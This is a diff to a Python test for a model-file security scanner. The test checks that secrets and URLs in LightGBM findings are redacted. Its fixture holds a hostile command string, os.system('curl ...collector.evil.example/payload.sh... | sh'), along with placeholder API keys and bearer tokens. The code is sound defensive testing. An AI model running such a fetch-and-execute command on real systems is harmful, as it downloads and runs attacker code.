@@ -274,7 +274,7 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
             [
                 (
                     "api_key=LGB_ADJACENT_SECRET Authorization: Bearer LGB_BEARER_SECRET "
-                    "metadata=os.system('curl "
+                    "metadata=os.system('curl LGB_STANDALONE_SECRET "
                     "https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag | sh') "
                 ),
                 "callback_url=https://lgb_user:lgb_pass@collector.evil.example/payload.sh?token=LGB_SECRET#frag",
@@ -292,8 +292,8 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     assert "LGB_SECRET" not in failed_details
     assert "LGB_ADJACENT_SECRET" not in failed_details
     assert "LGB_BEARER_SECRET" not in failed_details
-    assert "api_key=<redacted>" in failed_details
-    assert "authorization: bearer <redacted>" in failed_details
+    assert "LGB_STANDALONE_SECRET" not in failed_details
+    assert "model_text_may_contain_sensitive_literals" in failed_details
     assert "#frag" not in failed_details
 
 
